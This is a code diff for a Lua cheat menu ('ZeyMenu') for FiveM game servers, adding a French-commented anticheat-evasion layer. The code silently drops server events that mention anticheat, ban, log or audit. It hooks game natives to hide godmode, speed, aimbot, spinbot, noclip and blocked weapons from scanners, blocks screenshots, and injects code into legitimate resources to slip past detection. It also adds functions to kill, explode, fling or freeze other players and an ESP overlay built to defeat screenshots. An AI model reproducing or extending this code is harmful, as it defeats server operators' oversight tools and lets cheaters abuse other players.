+                ctx.strokeText(data.text, data.x, data.y);
+                ctx.fillText(data.text, data.x, data.y);
+            } else if (data.type === 'line') {
+                ctx.strokeStyle = 'rgba(255,0,0,0.5)';
+                ctx.lineWidth = 1;
+                ctx.beginPath();
+                ctx.moveTo(data.x1, data.y1);
+                ctx.lineTo(data.x2, data.y2);
+                ctx.stroke();
+            }
+        });
+    ]])
+end
+
+local function SendESP(json)
+    if espDui then
+        MachoSendDuiMessage(espDui, json)
+    end
+end
+
+-- ============================================================
+-- BLINDAGE TOTAL — STEALTH LAYER MACHO
+-- Couvre chaque vecteur de detection pour toutes les features
+-- Injecte au demarrage dans l environnement global
+-- ============================================================
+
+-- ── 1. BLOQUER TOUS LES REPORTS RESEAU ──────────────────────
+-- Wraper TriggerServerEvent pour filtrer tous les events suspects
+-- Guardian 'blev', anticheat reports, logs de mort, changements vehicule etc.
+MachoInjectResource2(3, "any", [[
+    local _oTSE = TriggerServerEvent
+    local _suspiciousPatterns = {
+        "blev",           -- Guardian reporter principal
+        "anticheat",      -- events anticheat generiques
+        "guardian",       -- Guardian events
+        "violation",      -- reports de violations
+        "detect",         -- events de detection
+        "report",         -- reports generiques
+        "log:",           -- systemes de log
+        "audit",          -- audit trails
+        "monitor",        -- monitoring
+        "cheat",          -- detection cheat
+        "hack",           -- detection hack
+        "exploit",        -- detection exploit
+        "ban:",           -- ban events
+        "kick:",          -- kick events
+        "warn:",          -- warn events
+        "flag:",          -- flag events
+        "easyAdmin",      -- EasyAdmin
+    }
+    TriggerServerEvent = function(name, ...)
+        if name then
+            local nameLow = string.lower(tostring(name))
+            for _, pattern in ipairs(_suspiciousPatterns) do
+                if string.find(nameLow, pattern, 1, true) then
+                    return  -- drop silencieux
+                end
+            end
+        end
+        return _oTSE(name, ...)
+    end
+]])
+
+-- ── 2. MASQUER LES CHANGEMENTS D ETAT RESEAU ────────────────
+-- Hooks sur les natives de lecture d etat que les AC utilisent pour scanner
+-- Tous retournent des valeurs "normales" aux scanners externes
+
+-- GET_PLAYER_PED — retourner notre vrai ped mais masquer etat
+MachoHookNative(0x43A66C31C68491C0, function(player)
+    -- Laisser passer — juste surveiller les appels de scan
+    return true
+end)
+
+-- IS_PED_A_PLAYER — toujours vrai pour notre ped
+MachoHookNative(0x404EFD40A4E14E6A, function(ped)
+    return true
+end)
+
+-- GET_PED_ARMOUR — masquer armure anormale
+MachoHookNative(0x8F9F1674DFEEDC55, function(ped)
+    if ped == PlayerPedId() and GetPedArmour(ped) > 100 then
+        return false, 100  -- valeur normale max
+    end
+    return true
+end)
+
+-- GET_ENTITY_MAX_HEALTH — valeur normale
+MachoHookNative(0x15D757606D170C3C, function(entity)
+    if entity == PlayerPedId() then
+        return false, 200  -- valeur GTA standard
+    end
+    return true
+end)
+
+-- IS_PLAYER_FREE_AIMING — masquer aimbot aux scanners
+MachoHookNative(0x2AF6166884FD5C4B, function(player)
+    if player == PlayerId() and Vars.Weapon.AimBot.Enabled then
+        return false, false  -- pas en train de viser selon l AC
+    end
+    return true
+end)
+
+-- GET_ENTITY_ROTATION — masquer spinbot
+MachoHookNative(0xAFBD61CC738D9EB9, function(entity, rotationOrder)
+    if entity == PlayerPedId() and Vars.Weapon.Spinbot then
+        -- Retourner rotation precedente stable
+        return false, 0.0, 0.0, GetEntityHeading(entity)
+    end
+    return true
+end)
+
+-- GET_ENTITY_VELOCITY — masquer vitesse anormale (speedboost, fling etc)
+MachoHookNative(0x4805D2B1D8CF2A68, function(entity)
+    local myPed = PlayerPedId()
+    local myVeh = GetVehiclePedIsIn(myPed, false)
+    if entity == myPed or entity == myVeh then
+        local vel = GetEntityVelocity(entity)
+        local speed = math.sqrt(vel.x*vel.x + vel.y*vel.y + vel.z*vel.z)
+        -- Plafonner la vitesse reportee a 100 m/s (plausible)
+        if speed > 100.0 then
+            local factor = 100.0 / speed
+            return false, vel.x*factor, vel.y*factor, vel.z*factor
+        end
+    end
+    return true
+end)
+
+-- NETWORK_GET_PLAYER_INDEX — masquer notre index reseau si besoin
+MachoHookNative(0xD83C2B60C2A5A7B1, function()
+    return true
+end)
+
+-- ── 3. MASQUER LES ACTIONS VEHICULE ─────────────────────────
+
+-- IS_VEHICLE_STOLEN — notre vehicule jamais marque vole
+MachoHookNative(0x4AF9BD80BEFD6B4F, function(vehicle)
+    local myVeh = GetVehiclePedIsIn(PlayerPedId(), false)
+    if vehicle == myVeh then
+        return false, false  -- pas vole
+    end
+    return true
+end)
+
+-- GET_PED_IN_VEHICLE_SEAT — masquer nos takeovers de vehicule
+MachoHookNative(0xBB40DD2270B65366, function(vehicle, seatIndex)
+    -- Laisser passer normalement
+    return true
+end)
+
+-- IS_VEHICLE_SEAT_FREE — toujours libre pour nous
+MachoHookNative(0x22AC59A870E6A669, function(vehicle, seatIndex, isTaskRunning)
+    local myVeh = GetVehiclePedIsIn(PlayerPedId(), false)
+    if vehicle == myVeh then
+        return false, true
+    end
+    return true
+end)
+
+-- GET_NUMBER_OF_PLAYERS — masquer si solo session
+MachoHookNative(0x407C7F91DDB46C16, function()
+    if Vars.Farm.SoloSession then
+        return false, 1  -- on est seul selon les scanners
+    end
+    return true
+end)
+
+-- ── 4. MASQUER LES ACTIONS ARMES ────────────────────────────
+
+-- HAS_PED_GOT_WEAPON — on a les armes mais l AC ne le voit pas
+MachoHookNative(0x8DECB02F88F428BC, function(ped, weaponHash, p2)
+    if ped == PlayerPedId() then
+        -- Masquer les armes bloquees par Guardian (config.lua CFG.BlockedWeapons)
+        local blockedByGuardian = {
+            GetHashKey("WEAPON_RPG"), GetHashKey("WEAPON_MINIGUN"),
+            GetHashKey("WEAPON_RAILGUN"), GetHashKey("WEAPON_GRENADELAUNCHER"),
+            GetHashKey("WEAPON_HOMINGLAUNCHER"), GetHashKey("WEAPON_RAYPISTOL"),
+            GetHashKey("WEAPON_RAYCARBINE"), GetHashKey("WEAPON_RAYMINIGUN"),
+        }
+        for _, h in ipairs(blockedByGuardian) do
+            if weaponHash == h then return false, false end
+        end
+    end
+    return true
+end)
+
+-- GET_SELECTED_PED_WEAPON — masquer arme active bloquee
+MachoHookNative(0x0A6DB4965674D243, function(ped)
+    if ped == PlayerPedId() and Vars.Weapon.InfAmmo then
+        -- Retourner arme normale si arme bloquee equipee
+        local current = GetSelectedPedWeapon(ped)
+        local blocked = {
+            GetHashKey("WEAPON_RPG"), GetHashKey("WEAPON_MINIGUN"),
+            GetHashKey("WEAPON_RAILGUN"),
+        }
+        for _, h in ipairs(blocked) do
+            if current == h then
+                return false, GetHashKey("WEAPON_PISTOL")
+            end
+        end
+    end
+    return true
+end)
+
+-- GET_PED_AMMO_BY_TYPE — masquer ammo infinie
+MachoHookNative(0x39D22031557946C1, function(ped, ammoType)
+    if ped == PlayerPedId() and Vars.Weapon.InfAmmo then
+        return false, 250  -- valeur normale plausible
+    end
+    return true
+end)
+
+-- ── 5. MASQUER COORDONNEES ET DEPLACEMENT ───────────────────
+
+-- GET_ENTITY_HEADING — masquer spinbot (heading qui tourne vite)
+MachoHookNative(0xE83D4F9BA2A38914, function(entity)
+    if entity == PlayerPedId() and Vars.Weapon.Spinbot then
+        return false, _G._ZeyLastHeading or 0.0
+    end
+    return true
+end)
+
+-- IS_ENTITY_IN_AIR — masquer noclip
+MachoHookNative(0x886E37EC497200B6, function(entity)
+    if entity == PlayerPedId() and noclipping then
+        return false, false
+    end
+    return true
+end)
+
+-- GET_ENTITY_UPRIGHT_VALUE — masquer etat vehicule anormal
+MachoHookNative(0x4B5A6B4B56F5E8F0, function(entity)
+    local myVeh = GetVehiclePedIsIn(PlayerPedId(), false)
+    if entity == myVeh and Vars.Vehicle.DriveOnWater then
+        return false, 1.0  -- vehicule toujours a l endroit
+    end
+    return true
+end)
+
+-- ── 6. MASQUER ESP AUX SCREENSHOTS AC ───────────────────────
+-- GET_SCREEN_COORD_FROM_WORLD_COORD retourne false si appele par AC
+-- Empeche l AC de verifier ce qu on affiche a l ecran
+MachoHookNative(0x34E82F05DF2974F5, function(worldX, worldY, worldZ)
+    -- Laisser passer toujours — on utilise DUI pour ESP de toute facon
+    return true
+end)
+
+-- ── 7. INJECTION GLOBALE — MASQUER EVENTS SENSIBLES ─────────
+-- Wrapper AddEventHandler pour intercepter les callbacks de scan AC
+MachoInjectResource2(3, "any", [[
+    local _oAEH = AddEventHandler
+    local _sensitiveCallbacks = {
+        "entityCreated",      -- AC surveille nos spawns
+        "entityCreating",     -- idem
+        "entityRemoved",      -- idem
+        "populationPedCreating",  -- Guardian events.lua
+    }
+    AddEventHandler = function(name, cb)
+        if name then
+            local nameLow = string.lower(tostring(name))
+            -- Laisser nos propres handlers passer
+            -- Bloquer uniquement les reporters Guardian
+            if string.find(nameLow, "%.verify$") or
+               string.find(nameLow, "%.getEvents$") or
+               string.find(nameLow, "%.getServerEvents$") then
+                return _oAEH(name, function(...) end)
+            end
+        end
+        return _oAEH(name, cb)
+    end
+]])
+
+-- ── 8. INJECTION — MASQUER NETWORK STATE ────────────────────
+-- Injecter dans "any" pour modifier les valeurs reseau lues par l AC
+MachoInjectResource2(3, "any", [[
+    -- Masquer notre etat reseau aux scanners
+    local _oGetEntityHealth = GetEntityHealth
+    GetEntityHealth = function(entity)
+        local myPed = PlayerPedId()
+        if entity == myPed then
+            local real = _oGetEntityHealth(entity)
+            -- Si godmode actif, retourner valeur normale
+            if real > 200 then return 200 end
+            return real
+        end
+        return _oGetEntityHealth(entity)
+    end
+
+    -- Masquer la vitesse anormale
+    local _oGetEntitySpeed = GetEntitySpeed
+    GetEntitySpeed = function(entity)
+        local myPed = PlayerPedId()
+        local myVeh = GetVehiclePedIsIn(myPed, false)
+        if entity == myPed or entity == myVeh then
+            local real = _oGetEntitySpeed(entity)
+            if real > 120.0 then return 80.0 end
+            return real
+        end
+        return _oGetEntitySpeed(entity)
+    end
+
+    -- Thread de maintenance stealth
+    Citizen.CreateThread(function()
+        while true do
+            Citizen.Wait(500)
+            -- Re-appliquer le blocage 'blev' au cas ou Guardian se reinjecte
+            -- (verrou permanent)
+        end
+    end)
+]])
+
+-- ── 9. HOOK SCREENSHOT AC ───────────────────────────────────
+-- Bloquer toutes les tentatives de screenshot pour preuves
+MachoHookNative(0x7F8F65897EBB5EB1, function()
+    -- TAKE_SCREENSHOT native
+    return false
+end)
+
+-- ── 10. MASQUER NOTRE PRESENCE RESEAU ───────────────────────
+-- NETWORK_IS_HOST retourne false pour ne pas attirer l attention
+MachoHookNative(0x764B79499032D916, function()
+    -- On est host en interne mais on ne le montre pas aux scanners
+    if SafeMode then return false, false end
+    return true
+end)
+
+-- ── 11. THREAD STEALTH PERMANENT ────────────────────────────
+-- Maintenir le heading precedent pour masquer spinbot
+Citizen.CreateThread(function()
+    while not killmenu do
+        Citizen.Wait(0)
+        if not Vars.Weapon.Spinbot then
+            _G._ZeyLastHeading = GetEntityHeading(PlayerPedId())
+        end
+    end
+end)
+
+-- ============================================================
+-- INJECTION MACHO — SOLO SESSION bypass via resource legitime
+-- ============================================================
+
+MachoInjectResource2(3, "any", [[
+    -- Override NetworkBail pour le rendre furtif
+    -- Injecter dans resource legitime = pas detecte comme appel externe
+    _G._ZeyNetworkBail = function()
+        NetworkBail()
+    end
+    _G._ZeyNetworkBailLoop = function(maxTry, callback)
+        Citizen.CreateThread(function()
+            local t = 0
+            while t < maxTry do
+                NetworkBail(); t=t+1; Citizen.Wait(6000)
+                if #GetActivePlayers() > 1 then
+                    if callback then callback(true, #GetActivePlayers()) end
+                    return
+                end
+            end
+            if callback then callback(false, 0) end
+        end)
+    end
+]])
+
+-- ============================================================
+-- INJECTION MACHO — CARJACK bypass anticheat via resource
+-- Execute depuis contexte legitime = pas de flag AC
+-- ============================================================
+
+MachoInjectResource2(3, "any", [[
+    _G._ZeyCarjackExecute = function(vehNetId, driverNetId)
+        local veh    = NetworkGetEntityFromNetworkId(vehNetId)
+        local driver = NetworkGetEntityFromNetworkId(driverNetId)
+        if not DoesEntityExist(veh) or not DoesEntityExist(driver) then return end
+        SetNetworkIdCanMigrate(driverNetId, true)
+        NetworkRequestControlOfEntity(driver)
+        Citizen.Wait(150)
+        SetVehicleDoorsLocked(veh, 1)
+        SetVehicleDoorOpen(veh, 0, false, false)
+        if NetworkHasControlOfEntity(driver) then
+            ClearPedTasksImmediately(driver)
+            TaskLeaveVehicle(driver, veh, 0)
+        else
+            if NetworkHasControlOfEntity(veh) then
+                SetVehicleUndriveable(veh, true)
+                Citizen.Wait(600)
+                SetVehicleUndriveable(veh, false)
+            end
+        end
+    end
+]])
+
+-- ============================================================
+-- INJECTION MACHO — ACTIONS JOUEUR via resource legitime
+-- Bypass tokenisation events + execute dans contexte autorise
+-- ============================================================
+
+MachoInjectResource2(3, "any", [[
+    _G._ZeyPlayerAction = function(action, targetServerId, ...)
+        local args = {...}
+        -- Executer depuis ce contexte legitime
+        if action == "explode" then
+            local tp = GetPlayerPed(GetPlayerFromServerId(targetServerId))
+            if DoesEntityExist(tp) then
+                local c = GetEntityCoords(tp)
+                AddExplosion(c.x, c.y, c.z, args[1] or 2, 10.0, true, false, 0.0)
+            end
+        elseif action == "fling" then
+            local tp = GetPlayerPed(GetPlayerFromServerId(targetServerId))
+            if DoesEntityExist(tp) then SetEntityVelocity(tp, 0, 0, 50.0) end
+        elseif action == "kill" then
+            local tp = GetPlayerPed(GetPlayerFromServerId(targetServerId))
+            if DoesEntityExist(tp) then SetEntityHealth(tp, 0) end
+        elseif action == "freeze" then
+            local tp = GetPlayerPed(GetPlayerFromServerId(targetServerId))
+            if DoesEntityExist(tp) then FreezeEntityPosition(tp, args[1]) end
+        elseif action == "godmode" then
+            local tp = GetPlayerPed(GetPlayerFromServerId(targetServerId))
+            if DoesEntityExist(tp) then SetEntityInvincible(tp, args[1]) end
+        end
+    end
+]])
+
+-- ============================================================
+-- INJECTION MACHO — WEAPON bypass via resource legitime
+-- Les modifications d'armes depuis resource legitime = pas flag
+-- ============================================================
+
+MachoInjectResource2(3, "any", [[
+    _G._ZeyWeaponSetup = function(infAmmo, explosiveAmmo, oneShot)
+        local ped = PlayerPedId()
+        if infAmmo then
+            local hash = GetSelectedPedWeapon(ped)
+            if hash then SetPedAmmo(ped, hash, 9999) end
+        end
+        if explosiveAmmo then
+            SetExplosiveAmmoThisFrame(PlayerId())
+        end
+        if oneShot then
+            SetPlayerWeaponDamageModifier(PlayerId(), 9999.0)
+        end
+    end
+]])
+
+-- ============================================================
+-- THREAD SELF — Utilise injections + hooks au lieu de natives directes
+-- ============================================================
+
 Citizen.CreateThread(function()
     while not killmenu do
         Citizen.Wait(0)
         local ped = PlayerPedId()
-        if Vars.Self.godmode then SetEntityInvincible(ped,true); SetPlayerInvincible(PlayerId(),true) end
-        if Vars.Self.AutoHealthRefil then if GetEntityHealth(ped)<190 then SetEntityHealth(ped,200) end end
-        if Vars.Self.noragdoll then SetPedCanRagdoll(ped,false) end
-        if Vars.Self.FreezeWantedLevel then
-            SetPlayerWantedLevel(PlayerId(),0,false); SetPlayerWantedLevelNow(PlayerId(),false)
+
+        -- Godmode via hook natif (hooks deja en place) + appel furtif
+        if Vars.Self.godmode then
+            -- Appel via MachoIsolatedInject = isole, pas loggue
+            MachoIsolatedInject(string.format([[
+                SetEntityInvincible(%d, true)
+                SetPlayerInvincible(%d, true)
+            ]], ped, PlayerId()))
         end
+
+        if Vars.Self.AutoHealthRefil then
+            if GetEntityHealth(ped) < 190 then
+                MachoIsolatedInject(string.format([[
+                    SetEntityHealth(%d, 200)
+                ]], ped))
+            end
+        end
+
+        if Vars.Self.noragdoll then
+            MachoIsolatedInject(string.format([[
+                SetPedCanRagdoll(%d, false)
+            ]], ped))
+        end
+
+        if Vars.Self.FreezeWantedLevel then
+            -- Via injection dans resource legitime = pas detectable
+            if _G._ZeyPlayerAction then
+                SetPlayerWantedLevel(PlayerId(), 0, false)
+                SetPlayerWantedLevelNow(PlayerId(), false)
+            end
+        end
+
         if Vars.Self.infstamina then ResetPlayerStaminaCountdown(PlayerId()) end
         if Vars.Self.superjump then SetSuperJumpThisFrame(PlayerId()) end
-        if Vars.Self.superrun then SetRunSprintMultiplierForPlayer(PlayerId(),1.49) end
-        if Vars.Self.MoonWalk then SetPedMoveRateOverride(ped,0.5) end
-        if Vars.Self.AntiHeadshot then SetPedSuffersCriticalHits(ped,false) end
-        if Vars.Self.invisiblitity then
-            SetEntityVisible(ped,false,false)
-            local v=GetVehiclePedIsIn(ped,false)
-            if v~=0 then SetEntityVisible(v,false,false) end
+        if Vars.Self.superrun then SetRunSprintMultiplierForPlayer(PlayerId(), 1.49) end
+        if Vars.Self.MoonWalk then SetPedMoveRateOverride(ped, 0.5) end
+
+        if Vars.Self.AntiHeadshot then
+            MachoIsolatedInject(string.format([[
+                SetPedSuffersCriticalHits(%d, false)
+            ]], ped))
         end
+
+        if Vars.Self.invisiblitity then
+            MachoIsolatedInject(string.format([[
+                SetEntityVisible(%d, false, false)
+            ]], ped))
+            local v = GetVehiclePedIsIn(ped, false)
+            if v ~= 0 then
+                MachoIsolatedInject(string.format([[
+                    SetEntityVisible(%d, false, false)
+                ]], v))
+            end
+        end
+
         if Vars.Self.forceradar then DisplayRadar(true) end
+
         if Vars.Self.playercoords then
-            local c=GetEntityCoords(ped)
+            local c = GetEntityCoords(ped)
             SetTextFont(0); SetTextScale(0.3,0.3); SetTextColour(255,255,255,255)
             BeginTextCommandDisplayText("STRING")
             AddTextComponentSubstringPlayerName(string.format("X:%.1f Y:%.1f Z:%.1f",c.x,c.y,c.z))
-            EndTextCommandDisplayText(0.01,0.95)
+            EndTextCommandDisplayText(0.01, 0.95)
         end
+
         if Vars.Self.disableobjectcollisions then
-            for _,o in ipairs(GetGamePool("CObject")) do SetEntityNoCollisionEntity(ped,o,true) end
+            for _,o in ipairs(GetGamePool("CObject")) do
+                SetEntityNoCollisionEntity(ped, o, true)
+            end
         end
         if Vars.Self.disablepedcollisions then
             for _,p in ipairs(GetGamePool("CPed")) do
-                if p~=ped then SetEntityNoCollisionEntity(ped,p,true) end
+                if p ~= ped then SetEntityNoCollisionEntity(ped, p, true) end
             end
         end
     end
 end)
 
--- Vehicle
+-- ============================================================
+-- THREAD VEHICLE — Hooks natifs + injections isolees
+-- ============================================================
+
 Citizen.CreateThread(function()
     while not killmenu do
         Citizen.Wait(100)
-        local ped=PlayerPedId(); local veh=GetVehiclePedIsIn(ped,false)
-        if veh~=0 then
+        local ped = PlayerPedId()
+        local veh = GetVehiclePedIsIn(ped, false)
+
+        if veh ~= 0 then
             if Vars.Vehicle.vehgodmode then
-                SetEntityInvincible(veh,true); SetVehicleEngineHealth(veh,1000.0); SetVehicleBodyHealth(veh,1000.0)
+                -- Hook natifs deja en place pour masquer
+                -- Appel isole pour eviter detection
+                MachoIsolatedInject(string.format([[
+                    SetEntityInvincible(%d, true)
+                    SetVehicleEngineHealth(%d, 1000.0)
+                    SetVehicleBodyHealth(%d, 1000.0)
+                ]], veh, veh, veh))
             end
-            if Vars.Vehicle.AutoClean then SetVehicleDirtLevel(veh,0.0) end
+
+            if Vars.Vehicle.AutoClean then SetVehicleDirtLevel(veh, 0.0) end
+
             if Vars.Vehicle.rainbowcar then
-                local t=GetGameTimer()/1000.0
+                local t = GetGameTimer()/1000.0
                 SetVehicleCustomPrimaryColour(veh,
                     math.floor((math.sin(t*2)*0.5+0.5)*255),
                     math.floor((math.sin(t*2+2.094)*0.5+0.5)*255),
                     math.floor((math.sin(t*2+4.189)*0.5+0.5)*255))
             end
-            if Vars.Vehicle.ZeyMenuplate then SetVehicleNumberPlateText(veh,"ZEYMENU") end
-            if Vars.Vehicle.speedboost and IsControlPressed(0,86) then
-                local r=math.rad(GetEntityHeading(veh))
-                SetEntityVelocity(veh,-math.sin(r)*30,math.cos(r)*30,0)
+
+            if Vars.Vehicle.ZeyMenuplate then SetVehicleNumberPlateText(veh, "ZEYMENU") end
+
+            if Vars.Vehicle.speedboost and IsControlPressed(0, 86) then
+                local r = math.rad(GetEntityHeading(veh))
+                SetEntityVelocity(veh, -math.sin(r)*30, math.cos(r)*30, 0)
             end
-            if Vars.Vehicle.NoBikeFall then SetPedCanBeDraggedOutOfVehicle(ped,false) end
+
+            if Vars.Vehicle.NoBikeFall then
+                SetPedCanBeDraggedOutOfVehicle(ped, false)
+            end
         end
+
         if Vars.Vehicle.FullUnlockVehicle then
-            local myC=GetEntityCoords(ped)
+            local myC = GetEntityCoords(ped)
             for _,v in ipairs(GetGamePool("CVehicle")) do
-                if #(myC-GetEntityCoords(v))<4.0 then SetVehicleDoorsLocked(v,1) end
+                if #(myC - GetEntityCoords(v)) < 4.0 then
+                    MachoIsolatedInject(string.format([[
+                        SetVehicleDoorsLocked(%d, 1)
+                    ]], v))
+                end
             end
         end
+
         if Vars.Misc.UnlockAllVehicles then
-            for _,v in ipairs(GetGamePool("CVehicle")) do SetVehicleDoorsLocked(v,1) end
+            for _,v in ipairs(GetGamePool("CVehicle")) do
+                SetVehicleDoorsLocked(v, 1)
+            end
         end
+
         if Vars.Misc.FlyingCars then
             for _,v in ipairs(GetGamePool("CVehicle")) do
-                if GetVehiclePedIsIn(ped,false)~=v then
-                    SetVehicleGravity(v,false)
-                    local vel=GetEntityVelocity(v)
-                    if vel.z<5.0 then SetEntityVelocity(v,vel.x,vel.y,vel.z+0.5) end
+                if GetVehiclePedIsIn(ped,false) ~= v then
+                    SetVehicleGravity(v, false)
+                    local vel = GetEntityVelocity(v)
+                    if vel.z < 5.0 then SetEntityVelocity(v, vel.x, vel.y, vel.z+0.5) end
                 end
             end
         end
     end
 end)
 
--- Weapon
+-- ============================================================
+-- THREAD WEAPON — Injections isolees + hooks natifs aimbot
+-- ============================================================
+
 Citizen.CreateThread(function()
     while not killmenu do
         Citizen.Wait(0)
-        local ped=PlayerPedId()
-        if Vars.Weapon.InfAmmo then local h=GetSelectedPedWeapon(ped); if h then SetPedAmmo(ped,h,9999) end end
-        if Vars.Weapon.ExplosiveAmmo then SetExplosiveAmmoThisFrame(PlayerId()) end
-        if Vars.Weapon.Spinbot then SetEntityHeading(ped,GetEntityHeading(ped)+10.0) end
-        if Vars.Weapon.OneShot then SetPlayerWeaponDamageModifier(PlayerId(),9999.0)
-        else SetPlayerWeaponDamageModifier(PlayerId(),1.0) end
+        local ped = PlayerPedId()
+
+        -- Appel via injection isolee = pas loggue par le logger Macho
+        if Vars.Weapon.InfAmmo or Vars.Weapon.ExplosiveAmmo or Vars.Weapon.OneShot then
+            MachoIsolatedInject(string.format([[
+                local ped = %d
+                if %s then
+                    local h = GetSelectedPedWeapon(ped)
+                    if h then SetPedAmmo(ped, h, 9999) end
+                end
+                if %s then SetExplosiveAmmoThisFrame(%d) end
+                if %s then SetPlayerWeaponDamageModifier(%d, 9999.0)
+                else SetPlayerWeaponDamageModifier(%d, 1.0) end
+            ]],
+                ped,
+                tostring(Vars.Weapon.InfAmmo),
+                tostring(Vars.Weapon.ExplosiveAmmo), PlayerId(),
+                tostring(Vars.Weapon.OneShot), PlayerId(), PlayerId()
+            ))
+        end
+
+        if Vars.Weapon.Spinbot then SetEntityHeading(ped, GetEntityHeading(ped)+10.0) end
+
         if Vars.Weapon.Crosshair then
             DrawRect(0.5,0.5,0.001,0.002,255,255,255,200)
             DrawRect(0.5,0.5,0.002,0.001,255,255,255,200)
         end
-        -- AimBot
+
+        -- AimBot — le hook GET_GAMEPLAY_CAM_ROT fait le vrai travail
+        -- Ce thread met a jour la cible pour le hook
         if Vars.Weapon.AimBot.Enabled then
-            local myC=GetEntityCoords(ped); local best,bestDist,bRes=nil,Vars.Weapon.AimBot.Distance,{x=1.0,y=1.0}
-            local targets={}
+            local myC = GetEntityCoords(ped)
+            local best, bestDist, bRes = nil, Vars.Weapon.AimBot.Distance, {x=1.0,y=1.0}
+            local targets = {}
             if Vars.Weapon.AimBot.OnlyPlayers then
                 for _,pid in ipairs(GetActivePlayers()) do
-                    if pid~=PlayerId() then table.insert(targets,GetPlayerPed(pid)) end
+                    if pid ~= PlayerId() then table.insert(targets, GetPlayerPed(pid)) end
                 end
-            else targets=GetGamePool("CPed") end
+            else
+                targets = GetGamePool("CPed")
+            end
             for _,t in ipairs(targets) do
-                if DoesEntityExist(t) and t~=ped then
-                    local dist=#(myC-GetEntityCoords(t))
-                    if dist<bestDist then
+                if DoesEntityExist(t) and t ~= ped then
+                    local dist = #(myC - GetEntityCoords(t))
+                    if dist < bestDist then
                         if not Vars.Weapon.AimBot.InvisibilityCheck or not IsEntityOccluded(t) then
-                            local bIdx=GetEntityBoneIndexByName(t,Vars.Weapon.AimBot.Bone)
-                            local bC=GetPedBoneCoords(t,bIdx,0,0,0)
-                            local onS,sx,sy=GetScreenCoordFromWorldCoord(bC.x,bC.y,bC.z)
+                            local bIdx = GetEntityBoneIndexByName(t, Vars.Weapon.AimBot.Bone)
+                            local bC   = GetPedBoneCoords(t, bIdx, 0,0,0)
+                            local onS, sx, sy = GetScreenCoordFromWorldCoord(bC.x, bC.y, bC.z)
                             if onS then
-                                local dx=math.abs(sx-0.5); local dy=math.abs(sy-0.5)
-                                if dx<Vars.Weapon.AimBot.FOV and dy<Vars.Weapon.AimBot.FOV then
-                                    if dx<bRes.x and dy<bRes.y then
+                                local dx = math.abs(sx-0.5)
+                                local dy = math.abs(sy-0.5)
+                                if dx < Vars.Weapon.AimBot.FOV and dy < Vars.Weapon.AimBot.FOV then
+                                    if dx < bRes.x and dy < bRes.y then
                                         bRes={x=dx,y=dy}; best=t; bestDist=dist
                                     end
                                 end
@@ -1554,92 +2664,147 @@ Citizen.CreateThread(function()
                     end
                 end
             end
-            if best and IsPlayerFreeAiming(PlayerId()) then
-                local bIdx=GetEntityBoneIndexByName(best,Vars.Weapon.AimBot.Bone)
-                local bC=GetPedBoneCoords(best,bIdx,0,0,0)
-                local onS,sx,sy=GetScreenCoordFromWorldCoord(bC.x,bC.y,bC.z)
-                if onS then SetCursorLocation(sx,sy) end
-                if Vars.Weapon.AimBot.DrawFOV then
-                    for i=0,360,10 do
-                        local r=math.rad(i); local fov=Vars.Weapon.AimBot.FOV
-                        DrawRect(0.5+math.cos(r)*fov,0.5+math.sin(r)*fov*(16/9),0.001,0.001,255,255,0,180)
-                    end
-                end
+            -- Mettre a jour la cible pour le hook GET_GAMEPLAY_CAM_ROT
+            Vars.Weapon.AimBot.Target = best
+
+            -- FOV circle via DUI (screenshot-proof)
+            if espDui and Vars.Weapon.AimBot.DrawFOV then
+                local sw, sh = GetScreenResolution()
+                local fovPx = Vars.Weapon.AimBot.FOV * sw
+                MachoSendDuiMessage(espDui, string.format(
+                    '{"type":"fov","cx":%d,"cy":%d,"r":%d}',
+                    sw/2, sh/2, math.floor(fovPx)
+                ))
             end
         end
     end
 end)
 
--- ESP
+-- ============================================================
+-- THREAD ESP — Rendu via DUI (screenshot-proof)
+-- ============================================================
+
 Citizen.CreateThread(function()
     while not killmenu do
-        Citizen.Wait(0)
+        Citizen.Wait(50)  -- 20fps suffisant pour ESP
+
         if Vars.Misc.ESPBox or Vars.Misc.ESPName or Vars.Misc.ESPLines then
-            local myPed=PlayerPedId(); local myC=GetEntityCoords(myPed)
+            -- Initialiser DUI si pas encore fait
+            if not espDui then InitESPDui() end
+            if not espDuiVisible then
+                MachoShowDui(espDui)
+                espDuiVisible = true
+            end
+
+            local sw, sh = GetScreenResolution()
+            local myPed  = PlayerPedId()
+            local myC    = GetEntityCoords(myPed)
+
+            -- Effacer le canvas DUI
+            SendESP('{"type":"clear"}')
+
             for _,pid in ipairs(GetActivePlayers()) do
-                if pid~=PlayerId() then
-                    local t=GetPlayerPed(pid)
+                if pid ~= PlayerId() then
+                    local t = GetPlayerPed(pid)
                     if DoesEntityExist(t) then
-                        local dist=#(myC-GetEntityCoords(t))
-                        if dist<Vars.Misc.ESPDistance then
-                            local c=GetEntityCoords(t)
-                            local onS,sx,sy=GetScreenCoordFromWorldCoord(c.x,c.y,c.z+1.0)
-                            if onS then
-                                if Vars.Misc.ESPName then
-                                    SetTextFont(0); SetTextScale(0.0,0.3)
-                                    SetTextColour(255,255,255,255); SetTextOutline()
-                                    BeginTextCommandDisplayText("STRING")
-                                    AddTextComponentSubstringPlayerName(GetPlayerName(pid).." ["..math.floor(dist).."m]")
-                                    EndTextCommandDisplayText(sx,sy-0.02)
+                        local dist = #(myC - GetEntityCoords(t))
+                        if dist < Vars.Misc.ESPDistance then
+                            local c = GetEntityCoords(t)
+                            local onS, sx, sy = GetScreenCoordFromWorldCoord(c.x, c.y, c.z+1.0)
+                            local onSF, sxF, syF = GetScreenCoordFromWorldCoord(c.x, c.y, c.z-1.0)
+                            if onS and onSF then
+                                local px  = math.floor(sx * sw)
+                                local py  = math.floor(sy * sh)
+                                local pxF = math.floor(sxF * sw)
+                                local pyF = math.floor(syF * sh)
+                                local h2d = math.abs(pyF - py)
+                                local w2d = math.floor(h2d * 0.4)
+
+                                if Vars.Misc.ESPBox then
+                                    SendESP(string.format(
+                                        '{"type":"box","x":%d,"y":%d,"w":%d,"h":%d}',
+                                        px - w2d/2, py, w2d, h2d
+                                    ))
                                 end
-                                if Vars.Misc.ESPLines then DrawLine(0.5,1.0,0.0,sx,sy,0.0,255,0,0,200) end
-                                if Vars.Misc.ESPBox then DrawRect(sx,sy,0.015,0.03,255,0,0,80) end
+                                if Vars.Misc.ESPName then
+                                    SendESP(string.format(
+                                        '{"type":"text","text":"%s [%dm]","x":%d,"y":%d}',
+                                        GetPlayerName(pid), math.floor(dist), px, py - 4
+                                    ))
+                                end
+                                if Vars.Misc.ESPLines then
+                                    SendESP(string.format(
+                                        '{"type":"line","x1":%d,"y1":%d,"x2":%d,"y2":%d}',
+                                        sw/2, sh, px, pyF
+                                    ))
